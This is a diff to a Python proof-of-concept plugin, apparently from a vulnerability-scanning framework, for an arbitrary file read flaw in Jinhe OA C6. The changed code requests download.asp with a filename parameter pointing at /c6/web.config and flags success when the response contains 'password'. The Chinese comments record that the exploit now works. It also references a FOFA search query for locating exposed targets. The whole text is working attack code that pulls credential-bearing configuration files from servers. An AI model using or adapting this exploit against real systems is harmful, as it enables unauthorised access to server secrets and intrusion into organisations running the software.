@@ -23,8 +23,11 @@ class POC(POCBase):
         "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-        金和OA C6 download.jsp文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息
-        笔者留言：这个漏洞最有意思地方就在于全网能搜到的都是各种文库资料，但是笔者即兴写的POC没有一个成功复现的，要么是笔者理解错了利用方式要么是网上的POC都是假的
+            金和OA C6 download.jsp文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息
+            v1： 
+                笔者留言：这个漏洞最有意思地方就在于全网能搜到的都是各种文库资料，但是笔者即兴写的POC没有一个成功复现的，要么是笔者理解错了利用方式要么是网上的POC都是假的
+            v2：
+                POC没问题，是之前判断方式有问题，现在能用了，
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
@@ -44,7 +47,7 @@ class POC(POCBase):
         """
         vuln = [False,""]
         url = self.target + "/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config" # url自己按需调整
-        
+
 
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
@@ -56,7 +59,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "Response.Buffer" in req.text and req.status_code == 200:#req.status_code == 200 and :
+            if "password" in req.text and "MicrosoftWebControls" in req.text and req.status_code == 200 and "application/octet-stream" in req.headers["Content-Type"]:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
